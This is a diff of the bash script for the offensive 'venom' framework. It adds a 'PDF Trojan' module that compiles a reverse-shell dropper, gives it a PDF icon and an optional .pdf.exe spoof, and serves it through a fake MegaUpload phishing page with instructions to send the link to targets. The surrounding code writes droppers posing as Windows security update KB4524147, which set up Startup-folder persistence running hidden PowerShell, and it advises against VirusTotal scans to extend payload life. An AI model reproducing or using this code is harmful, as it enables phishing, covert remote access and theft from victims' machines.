+    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    LOLBin             : Powershell (DownloadFile)
+    DROPPER EXTENSION  : BAT
+    AGENT EXTENSION    : PS1
+    AGENT PERSISTENCE  : AVAILABLE (meterpeter)
+
+    AGENT Nº5
+    ─────────
+    DESCRIPTION        : Reverse TCP Shell (PDF Trojan)
+    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    LOLBin             : Powershell (DownloadFile)
+    DROPPER EXTENSION  : EXE|PDF.EXE
+    AGENT EXTENSION    : EXE
+    AGENT PERSISTENCE  : NOT AVAILABLE
 
 
-    ╔─────────────────────────────────────────────────────────────╗
+    ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
     ║   E    - Exit venom Framework                               ║
-    ║   H    - Start Stored Handler (persistence)                 ║
-    ╚─────────────────────────────────────────────────────────────╝
+    ╚═════════════════════════════════════════════════════════════╝
 
 
 !
@@ -11996,150 +12005,12 @@ case $choice in
 2) sh_evasion2 ;;
 3) sh_evasion3 ;;
 4) sh_evasion4 ;;
+5) sh_evasion5 ;;
 m|M) sh_menu ;;
 e|E) sh_exit ;;
-h|H) sh_per_handler ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_ninja ;;
 esac
 }
-
-
-
-# ---------------------------------------------
-# EASY START OF PERSISTENCE HANDLER(S) FUNCTION
-# ---------------------------------------------
-sh_per_handler () {
-Colors;
-
-count=0
-cd $IPATH/output
-## Make sure that [.handler] files are present
-per_list=$(ls|grep '.handler')
-if [ -z "$per_list" ]; then
-echo "${RedF}[x]${white} Abort module execution ..";sleep 1
-echo "${RedF}[x]${white} None Persistence Handler Files Found ..${BlueF}";sleep 2
-cat << !
----
-- To be abble to use this Module, we need first to [persiste] our agent into
-- target system. Then venom will auto store the persistence handler settings
-- into venom/output folder under the extenstion [.handler] that this Function
-- Requerires to work. [Agents nº (2|3) will write the neccesary .handler file]
----
-!
-echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Press any key to Return to Amsi Evasion Menu ..";read fiu
-clear;sh_ninja
-fi
-
-
-## This function Lists until [9] occurrencies {Files} ..
-echo "";echo "${BlueF}Listing Persistence Handler(s) Stored${white}"
-echo "-------------------------------------";sleep 1
-for i in $per_list; do
-   count=$(($count+1)) # count nº of occurencies {max:9}
-   echo "[$count] $i"  # display each occurrencie with id number attach
-   if [ "$count" = "1" ]; then
-      um="$i"
-   elif [ "$count" = "2" ]; then
-      dois="$i"
-   elif [ "$count" = "3" ]; then
-      tres="$i"
-   elif [ "$count" = "4" ]; then
-      quatro="$i"
-   elif [ "$count" = "5" ]; then
-      cinco="$i"
-   elif [ "$count" = "6" ]; then
-      seis="$i"
-   elif [ "$count" = "7" ]; then
-      sete="$i"
-   elif [ "$count" = "8" ]; then
-      oito="$i"
-   elif [ "$count" = "9" ]; then
-      nove="$i"
-   fi
-done
-
-
-## Sellection of { Handler Number | Handler Name }
-echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Chose Handler Number: ";read sellection
-## Make sure user have input sellection number
-if [ -z "$sellection" ]; then
-  echo "${RedF}[x]${white} Abort module execution .."${Reset};sleep 1
-  echo "${RedF}[x]${white} None [Handler Number Sellected] .."${Reset};sleep 3
-  clear;sh_ninja
-fi
-if [ "$sellection" = "1" ]; then
-   handler="$um"
-elif [ "$sellection" = "2" ]; then
-   handler="$dois"
-elif [ "$sellection" = "3" ]; then
-   handler="$tres"
-elif [ "$sellection" = "4" ]; then
-   handler="$quatro"
-elif [ "$sellection" = "5" ]; then
-   handler="$cinco"
-elif [ "$sellection" = "6" ]; then
-   handler="$seis"
-elif [ "$sellection" = "7" ]; then
-   handler="$sete"
-elif [ "$sellection" = "8" ]; then
-   handler="$oito"
-elif [ "$sellection" = "9" ]; then
-   handler="$nove"
-fi
-
-
-## Reading settings from sellected stored file ..
-set_lhost=$(cat $handler|grep -m 1 'LHOST'|cut -d ':' -f2)
-set_lport=$(cat $handler|grep -m 1 'LPORT'|cut -d ':' -f2)
-set_state=$(cat $handler|grep -m 1 'SILENT'|cut -d ':' -f2)
-set_handler=$(cat $handler|grep -m 1 'HANDLER'|cut -d ':' -f2)
-set_dates=$(cat $handler|grep -m 1 'ACTIVE_ON'|cut -d '=' -f2)
-set_name=$(cat $handler|grep -m 1 'KB4524147'|grep -oE "[^\]+$")
-
-
-## Make sure we have captured any settings
-# [HANDLER] string contains the handler command.
-if [ -z "$set_handler" ]; then
-  echo "${RedF}[x]${white} Abort module execution .."${Reset};sleep 1
-  echo "${RedF}[x]${white} None [HANDLER:] Command Found .."${Reset};sleep 3
-  clear;sh_ninja
-fi
-
-
-echo "";echo ""
-## Displaying settings to user
-echo "${BlueF}Handler: $handler"${Reset};
-cat << !
-------------------------------------
-SILENT    : $set_state
-LPORT     : $set_lport
-LHOST     : $set_lhost
-LOLBin    : Powershell (Download)
-STARTUP   : $set_name
-ACTIVE_ON : $set_dates
-
-
-!
-## Execute Sellected Handler Settings to Run.
-sellection=$(zenity --list --title "☠ HANDLER SELLECTION ☠" --text "\nChose From Available Options:" --radiolist --column "Pick" --column "Option" TRUE "Run Sellected Handler (default)" FALSE "Chose A New Handler File" FALSE "Just Start Netcat -lvp [port]" FALSE "Return to Amsi Evasion Menu" --width 350 --height 260) > /dev/null 2>&1
-if [ "$sellection" = "Run Sellected Handler (default)" ]; then
-   xterm -T " PERSISTENCE HANDLER - $set_lhost:$set_lport" -geometry 110x23 -e "echo StartUp: [$set_name][Silent:$set_state];$set_handler"
-elif [ "$sellection" = "Just Start Netcat -lvp [port]" ]; then
-   echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Input Port Number: "; read revport
-   xterm -T " PERSISTENCE HANDLER " -geometry 110x23 -e "sudo nc -lvp $revport"
-elif [ "$sellection" = "Chose A New Handler File" ]; then
-   sleep 1;clear;sh_per_handler
-else
-  echo "${RedF}[x]${white} Abort Module Execution .."${Reset};sleep 2
-fi
-
-
-## Exit Module
-cd $IPATH
-sleep 2;clear
-sh_ninja
-}
-
 
 
 
@@ -12203,7 +12074,7 @@ if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ] || [ -z "$easter_egg" 
    # DESCRIPTION: dropper.ps1 will write in $env:tmp folder the REAL dropper (KB4524147_4nF7.ps1)
    # then it will execute it in one PS hidden console (to download/execute real payload.ps1 in-memory)..
    echo "<#" > $IPATH/output/$Drop.ps1
-   echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
+   echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/$Drop.ps1
    echo "#>" >> $IPATH/output/$Drop.ps1
    echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
    echo "write-host \"Please Be Patience While We Search For Available Updates to \$env:userdomain System\" -ForegroundColor gray -BackgroundColor Black;" >> $IPATH/output/$Drop.ps1
@@ -12219,7 +12090,7 @@ else
    echo "${BlueF}[☠]${white} Building Obfuscated vbs dropper ..${white}";sleep 2
    ## Silent Execution -> OBFUSCATION=ON (none PS terminal window pops up)
    # REMARK: A MessageBox will pop up announcing that are KB updates available.
-   echo "' Framework: venom v1.0.16 (amsi evasion)" > $IPATH/output/$Drop.vbs
+   echo "' Framework: venom v1.0.17 (amsi evasion)" > $IPATH/output/$Drop.vbs
    echo "Dim domain,x,u" >> $IPATH/output/$Drop.vbs
    echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $IPATH/output/$Drop.vbs
    echo "domain = objShell.ExpandEnvironmentStrings(\"%userdomain%\")" >> $IPATH/output/$Drop.vbs
@@ -12233,7 +12104,7 @@ fi
 echo "${BlueF}[☠]${white} Writting TCP reverse shell to output .."${Reset};sleep 2
 echo "<#" > $IPATH/output/$NaM.ps1
 echo "Obfuscated Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
-echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
+echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/$NaM.ps1
 echo "Original shell: @ZHacker13" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
@@ -12427,13 +12298,13 @@ else
    ## Persistence Module Function (VBScript|BATch)
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       ## Silent Persistence script execution (no terminal prompt) using VBS script.
-      echo "echo ' Framework: venom v1.0.16 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.bat
+      echo "echo ' Framework: venom v1.0.17 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.bat
       echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
       echo "echo objShell.Run \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat 
    else
       ## Persistence script execution (minimized terminal prompt) using BATCH script.
       echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo :: Framework: venom v1.0.16 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo :: Framework: venom v1.0.17 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
@@ -12447,7 +12318,7 @@ fi
 echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output .."${Reset};sleep 2
 echo "<#" > $IPATH/output/$NaM.ps1
 echo "Obfuscated Reverse OpenSSL Shell" >> $IPATH/output/$NaM.ps1
-echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
+echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/$NaM.ps1
 echo "Original shell: @int0x33" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
@@ -12674,13 +12545,13 @@ else
    ## Persistence Module Function (VBScript|BATch)
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       ## Silent Persistence script execution (no terminal prompt) using VBS script.
-      echo "echo ' Framework: venom v1.0.16 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.$ext.bat
+      echo "echo ' Framework: venom v1.0.17 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.$ext.bat
       echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo objShell.Run \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
    else
       ## Persistence script execution (minimized terminal prompt) using BATCH script.
       echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo :: Framework: venom v1.0.16 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo :: Framework: venom v1.0.17 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
@@ -12709,7 +12580,7 @@ echo "${BlueF}[☠]${white} Obfuscated ip addr (hex):${GreenF}$hexed${white}";sl
 echo "${BlueF}[☠]${white} Writting Reverse Powershell Shell to output ..";sleep 2
 echo "<#" > $IPATH/output/$NaM.ps1
 echo "Obfuscated (hex) Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
-echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
+echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/$NaM.ps1
 echo "Original shell: Paranoid Ninja" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
@@ -12931,12 +12802,275 @@ rm $ApAcHe/Update-KB4524147.zip > /dev/nul 2>&1
 
 ## Jump to Main menu
 sleep 3
-sh_ninja
+sh_menu
 }
 
 
 
+# ------------------------------------------
+# PDF Trojan Horse (social enginering)
+# https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)
+# ------------------------------------------
+sh_evasion5 () {
+Colors;
 
+## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
+echo "---"
+echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "- Please Dont test samples on Virus Total or on similar"${Reset};
+echo "- online scanners, because that will shorten the payload life."${Reset};
+echo "- And in testings also remmenber to stop the windows defender"${Reset};
+echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
+echo "---"
+sleep 2
+
+
+# ----------------- Dependencies Checks -----------------
+
+
+## Make Sure all dependencies are meet
+# check if mingw32 OR mingw-W64 GCC library exists
+echo "${BlueF}[${YellowF}i${BlueF}]${white} Checking Module Dependencies.${white}";sleep 2
+audit=$(which $ComP) > /dev/null 2>&1
+if [ "$?" -ne "0" ]; then
+   echo "${RedF}[ERROR] mingw32 GCC compiler not found ($ComP)${white}"
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Info: https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)";sleep 2
+   if [ "$ArCh" = "x64" ]; then
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
+      echo "" && sudo apt-get update && apt-get install -y mingw-w64 && echo ""
+      ComP="i686-w64-mingw32-gcc" # GCC library used to compile binary
+   else
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
+      echo "" && sudo apt-get update && apt-get install -y mingw32 && echo ""
+      ComP="i586-mingw32msvc-gcc" # GCC library used to compile binary
+   fi
+fi
+
+
+## Activating Wine Multi-Arch Support in x64 distros
+# WINEARCH=win32 WINEPREFIX=/root/.wine32 winecfg
+audit=$(which wine) > /dev/null 2>&1
+if [ "$?" -ne "0" ]; then
+   echo "${RedF}[ERROR] none wine installation found.${white}";sleep 2
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing wine."
+   echo "" && sudo apt-get update && apt-get install -y wine && winecfg && echo ""
+fi
+
+if [ -e "$IPATH/aux/WineMultiArch" ]; then
+   rootwine=$(cat $IPATH/aux/WineMultiArch) # read wine full path from WineMultiArch file
+else
+   askpath=$(zenity --title="☠ Enter the location of .wine directory ☠" --text "example: /root/.wine\nexample: /home/pedro/.wine" --entry --width 300) > /dev/null 2>&1
+   rootwine=$(echo $askpath|sed "s|.wine||")   # set 'first time run' wine full path variable declaration.
+   echo "$rootwine" > $IPATH/aux/WineMultiArch # write WineMultiArch file, to prevent this ZENITY question again
+fi
+
+if [ "$ArCh" = "x64" ]; then # 64-bit configurations
+   if [ ! -d "$rootwine.wine32" ]; then
+      echo "${RedF}[ERROR] $rootwine.wine32 directory not found.${white}"
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Info: https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)"
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing wine32:i386";sleep 2
+      echo ""
+      sudo dpkg --add-architecture i386 && sudo apt-get update
+      sudo apt-get -y dist-upgrade --allow-downgrades
+      sudo apt-get install -y wine wine32:i386 wine64 libwine libwine:i386 fonts-wine winbind winetricks
+      echo ""
+
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Activating Wine Multi-Arch Support."
+      if [ ! -d "/run/user/0/" ]; then sudo mkdir -p /run/user/0/;fi
+      sudo WINEARCH=win32 WINEPREFIX=$rootwine.wine32 winecfg
+
+      cd $IPATH/bin
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Installing wine-mono-4.9.4 (msi)"
+      echo "" && wine msiexec /i wine-mono-4.9.4.msi && echo ""
+      multiArch="TRUE"
+      cd $IPATH
+
+   else
+
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Activating Wine Multi-Arch Support."
+      sudo WINEARCH=win32 WINEPREFIX=$rootwine.wine32 winecfg
+      multiArch="TRUE"
+   fi
+
+elif [ "$ArCh" = "x86" ]; then # 32-bit configurations
+
+   if [ ! -d "$rootwine.wine" ]; then
+      echo "${RedF}[ERROR] $rootwine.wine directory not found.${white}"
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Info: https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)"
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing wine";sleep 2
+      echo "" && sudo apt-get update && apt-get install -y wine && winecfg && echo ""
+      multiArch="FALSE"
+   fi
+
+else # none .wine OR .wine32 folder's found
+
+   echo "${RedF}[ERROR] Aborting: /???/.wine directory not found.${white}";sleep 2
+   exit
+fi
+
+
+## check if ResourceHacker.exe exists
+# ResourceHacker requires wine 32-bit because its a x86 binary
+if [ -d "$rootwine.wine32" ]; then # x64 bit system
+
+   multiwine="$rootwine.wine32/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe"
+   if [ ! -f "$multiwine" ]; then
+      echo "${RedF}[ERROR] ResourceHacker.exe (wine32) not found.${white}"
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Info: https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)";sleep 2
+      cd $IPATH/bin
+      echo "" && wine reshacker_setup.exe && echo ""
+      cd $IPATH
+   fi
+
+elif [ -d "$rootwine.wine" ]; then # x86 bit system
+
+   multiwine="$rootwine.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe"
+   if [ ! -f "$multiwine" ]; then
+      echo "${RedF}[ERROR] ResourceHacker.exe (wine) not found.${white}"
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Info: https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)";sleep 2
+      cd $IPATH/bin
+      echo "" && wine reshacker_setup.exe && echo ""
+      cd $IPATH
+   fi
+
+else # none .wine folder found
+
+   echo "${RedF}[ERROR] Not Found => $rootwine.wine OR $rootwine.wine32 (multi-arch) ${white}"
+   echo "${RedF}[ERROR]${white} Not Found => $multiwine ${white}"
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Info: https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)";sleep 2
+   exit
+fi
+
+
+# -------------------------------------------------------
+
+
+## Store User Inputs (module bash variable declarations)..
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+UpL=$(zenity --title "☠ CHOSE ONE PDF DOC TO BE TROJANIZED ☠" --filename=$IPATH --file-selection --text "Input one PDF document to be embbebed with our revshell") > /dev/null 2>&1
+## Make sure attacker have sellected one PDF doc
+TestExtension=$(echo $UpL|cut -d '.' -f2)    # store extension sellection
+FullName=$(echo "${UpL##*/}"|cut -d '.' -f1) # store filename  sellection
+if [ "$TestExtension" != "pdf" ]; then
+   echo "${RedF}[ERROR] This Module requires one PDF document to trojanize.${white}";sleep 2
+   echo "${RedF}[x]${white} The File Extension chosen: ${BlueF}$FullName${RedF}.$TestExtension ${white}its NOT Accepted.${white}"
+   exit
+fi
+Drop=$(zenity --title="☠ Enter DROPPER FILENAME ☠" --text "example: Curriculum\nWarning: Allways Start FileNames With 'Capital Letters'\n\nIf 'FileName' input its leave blank, then venom will\nuse the pdf 'FileName' to rename the dropper.exe" --entry --width 300) > /dev/null 2>&1
+
+
+## Setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$Drop" ]; then Drop="$FullName";fi
+
+
+## Display final settings to user.
+echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 2
+echo ${BlueF}"---"
+cat << !
+    LPORT    : $lport
+    LHOST    : $lhost
+    LOLBin   : Powershell (DownloadFile)
+    DROPPER  : $IPATH/output/$Drop.exe
+    PDFdoc   : $IPATH/output/$Drop.pdf
+    AGENT    : $IPATH/output/Client.exe
+    UPLOADTO : C:\\Users\\Public\\ (remote)
+!
+echo "---"
+
+
+cd $IPATH/output
+## BUILD DROPPER (to download/execute our legit pdf and agent.ps1).
+echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
+cp $UpL $IPATH/output/$Drop.pdf # Copy/rename legit pdf to output folder
+cp $IPATH/templates/dropper.c $IPATH/output/dropper.c
+sed -i "s|LhOsT|$lhost|g" dropper.c
+sed -i "s|LpOrT|$lport|g" dropper.c
+sed -i "s|FiLNaMe|$Drop|g" dropper.c
+
+## COMPILING C Program USING mingw32 OR mingw-W64
+echo "${BlueF}[☠]${white} Compiling dropper using mingw32."${Reset};sleep 2
+# special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
+$ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
+rm $IPATH/output/dropper.c > /dev/nul 2>&1
+
+
+## Use resourceHacker (wine32) to change the dropper.exe icon
+echo "${BlueF}[☠]${white} Changing dropper.exe icon (RH)"${Reset};
+wine "$wineSupport" -open "$IPATH/output/$Drop.exe" -save "$IPATH/output/$Drop.exe" -action addskip -res "$IPATH/bin/icons/AdobePDF.ico" -mask ICONGROUP,MAINICON,
+
+
+## Spoof dropper extension ? (dropper.pdf.exe OR dropper.exe ?)
+Spoof=$(zenity --list --title "☠ SPOOF DROPPER EXTENSION ? ☠" --text "\nDo you wish to Spoof dropper.exe extension ? (dropper.pdf.exe)\nWarning: Spoofing dropper.exe extension migth flag AV detection." --radiolist --column "Pick" --column "Option" TRUE "$Drop.exe (default)" FALSE "$Drop.pdf.exe (spoof)") > /dev/null 2>&1
+if [ "$Spoof" = "$Drop.pdf.exe (spoof)" ]; then echo "${BlueF}[${YellowF}i${BlueF}]${white} Spoofing dropper.exe extension (.pdf.exe)"${Reset};sleep 2;fi
+echo "${BlueF}[☠]${white} Writting Client rev tcp shell to output."${Reset};sleep 2
+
+
+## Building 'the Download Webpage' in HTML
+echo "${BlueF}[☠]${white} Building HTML Download WebPage (apache2)"${Reset};sleep 2
+cd $IPATH/templates/phishing
+sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
+mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
+
+cd $IPATH/output
+if [ "$Spoof" = "$Drop.pdf.exe (spoof)" ]; then
+   ## Attacker have chosen to spoof the dropper extension
+   mv $IPATH/output/$Drop.exe $IPATH/output/$Drop.pdf.exe > /dev/nul 2>&1
+   zip $Drop.zip $Drop.pdf.exe > /dev/nul 2>&1 # ZIP dropper.pdf.exe
+else
+   zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
+fi
+echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
+cp $IPATH/bin/Client.exe $ApAcHe/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
+cp $IPATH/bin/Server.exe $IPATH/output/Server.exe > /dev/nul 2>&1 # Server
+mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
+cp $IPATH/output/$Drop.pdf $ApAcHe/$Drop.pdf > /dev/nul 2>&1 # Legit PDF doc
+cd $IPATH
+
+
+## Print attack vector on terminal
+echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
+echo "${BlueF}---"
+echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
+echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
+echo "${BlueF}- SYSINFO: systeminfo|findstr /C \"Host OS Manufacturer Type\""
+echo "${BlueF}---"${Reset};
+echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Press any key to start a handler."
+read stupidpause
+
+## START SERVER HANDLER ON SELLECTED IP/PORT NUMBER
+cd $IPATH/output
+LocalHostName="\\\\"$(hostname)
+xterm -T " $LocalHostName - SERVER LISTENER - $lhost:$lport" -geometry 120x23 -e "wine Server.exe ip=$lhost port=$lport"
+cd $IPATH
+sleep 1
+
+
+## Clean old files.
+echo "${BlueF}[☠]${white} Please Wait, cleaning old files.${white}";sleep 2
+rm $ApAcHe/$Drop.pdf > /dev/nul 2>&1
+rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
+rm $ApAcHe/Client.exe > /dev/nul 2>&1
+rm $ApAcHe/Download.html > /dev/nul 2>&1
+rm $IPATH/output/dropper.c > /dev/nul 2>&1
+rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
+rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
+rm $IPATH/output/Server.exe > /dev/nul 2>&1
+rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+
+
+## Revert wine32 (32-bit) to wine64 (64-bit) => Only on x64 arch's attacker system
+if [ "$multiArch" = "TRUE" ]; then
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Reverting Wine32 (32-bit) to Wine64 (64-bit)${white}";sleep 2
+   echo "${BlueF}[${GreenF}✔${BlueF}]${white} sudo WINEARCH=win64 WINEPREFIX=$rootwine.wine winecfg${white}"
+   sudo WINEARCH=win64 WINEPREFIX=$rootwine.wine winecfg
+   arch="wine64" # Define 'venom' $arch variable again, to be able use other modules. 
+fi
+
+sh_menu
+}
 
 
 
@@ -13124,50 +13258,50 @@ cat << !
 
 
     AGENT Nº1:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Linux|Bsd|Solaris|OSx
-    | SHELLCODE FORMAT   : C
-    | AGENT EXTENSION    : ---
-    | AGENT EXECUTION    : sudo ./agent
-    | DETECTION RATIO    : http://goo.gl/XXSG7C
+    ──────────
+    TARGET SYSTEMS     : Linux|Bsd|Solaris|OSx
+    SHELLCODE FORMAT   : C
+    AGENT EXTENSION    : ---
+    AGENT EXECUTION    : sudo ./agent
+    DETECTION RATIO    : http://goo.gl/XXSG7C
 
     AGENT Nº2:
-    ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Linux|Bsd|solaris
-    | SHELLCODE FORMAT   : SH|PYTHON
-    | AGENT EXTENSION    : DEB
-    | AGENT EXECUTION    : sudo dpkg -i agent.deb
-    | DETECTION RATIO    : https://goo.gl/RVWKff
+    ──────────
+    TARGET SYSTEMS     : Linux|Bsd|solaris
+    SHELLCODE FORMAT   : SH|PYTHON
+    AGENT EXTENSION    : DEB
